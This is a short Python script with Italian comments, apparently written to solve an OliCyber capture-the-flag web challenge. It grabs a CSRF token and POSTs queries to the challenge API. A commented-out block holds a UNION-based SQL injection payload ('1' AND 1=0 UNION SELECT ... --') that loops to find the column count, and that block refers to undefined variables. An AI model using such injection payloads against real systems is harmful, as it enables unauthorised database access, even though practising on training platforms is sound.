import requests
from CSRF import sniff_csrf

# assumo che sniff_csrf sia importato e disponibile e che tu abbia già creato session
# session = requests.Session()
# Result = sniff_csrf(urlSezione, do_test_post=True, session=session, verbose=True)

# --- codice minimo a partire da quanto hai mandato ---
session = requests.Session()
urlSezione = "http://web-17.challs.olicyber.it/union"
sezione = session.get(urlSezione)
# mycookies = {'session': sezione.cookies.get('session')}  # non necessario: session gestisce i cookie

Result = sniff_csrf(urlSezione, do_test_post=True, session=session, verbose=True)

# estrai il token js-token (se esiste) dal risultato
csrf_value = None
for src, name, val in Result.get("findings_html", []):
    if src == "js-token" and val:
        csrf_value = val
        break

if not csrf_value:
    print("Nessun js-token trovato; esco.")
    raise SystemExit(1)

# payload minimo
api_url = "http://web-17.challs.olicyber.it/api/union"
payload = {"query": "1"}

# headers minimi con token (invio i due nomi comuni)
headers = {
    "X-CSRF-Token": csrf_value,
    "X-CSRFToken": csrf_value,
}

r = session.post(api_url, data=payload, headers=headers, timeout=10)

print("POST ->", r.status_code)
print("Response snippet:\n", r.text[:800])
print("\nRequest headers sent:")
for k, v in r.request.headers.items():
    print(f"  {k}: {v}")

'''
for i in range(1, 11):
    # aggiunge una colonna alla volta
    collumstring += str(i)
    
    # se non è l'ultima colonna, aggiunge una virgola
    if i < 10:
        collumstring += ","
    
    payload = {
        "query": f"1' AND 1=0 UNION SELECT {collumstring} -- "
    }
    
    r = session.post(url, data=payload,cookies=cookies)
    print(f"Test con {i} colonne → {r.status_code}")
    print(r.text)
'''